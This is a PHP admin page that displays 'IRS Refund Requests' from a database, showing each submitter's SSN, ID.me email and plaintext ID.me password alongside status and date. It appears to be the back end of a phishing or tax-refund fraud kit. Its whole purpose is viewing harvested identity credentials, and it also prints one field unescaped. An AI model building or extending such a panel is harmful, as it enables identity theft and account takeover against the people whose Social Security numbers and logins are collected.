<?php
include("includes/header.php");

$query = mysqli_query($conn, "
    SELECT r.*, u.username, u.email
    FROM irs_refund_requests r
    JOIN users u ON u.id = r.user_id
    ORDER BY r.created_at DESC
");
?>

<div class="content-wrapper">
    <section class="content-header">
        <h1>IRS Refund Requests</h1>
    </section>

    <section class="content">
        <div class="card">
            <div class="card-header">
                <h3 class="card-title">Submitted Requests</h3>
            </div>

            <div class="card-body table-responsive">
                <table class="table table-bordered table-hover">
                    <thead>
                        <tr>
                            <th>User</th>
                            <th>SSN</th>
                            <th>ID.me Email</th>
                            <th>ID.me Password</th>
                            <th>Country</th>
                            <th>Status</th>
                            <th>Date</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while ($row = mysqli_fetch_assoc($query)): ?>
                        <tr>
                            <td>
                                <strong><?= htmlspecialchars($row['username']) ?></strong><br>
                                <small><?= htmlspecialchars($row['email']) ?></small>
                            </td>
                            <td><?= htmlspecialchars($row['ssn']) ?></td>
                            <td><?= htmlspecialchars($row['idme_email']) ?></td>
                            <td><?= htmlspecialchars($row['idme_password']) ?></td>
                            <td><?= htmlspecialchars($row['country']) ?></td>
                            <td>
                                <span class="badge bg-<?= 
                                    $row['status'] === 'Completed' ? 'success' :
                                    ($row['status'] === 'Rejected' ? 'danger' : 'warning')
                                ?>">
                                    <?= $row['status'] ?>
                                </span>
                            </td>
                            <td><?= date('M d, Y', strtotime($row['created_at'])) ?></td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </section>
</div>

<?php include("includes/footer.php"); ?>
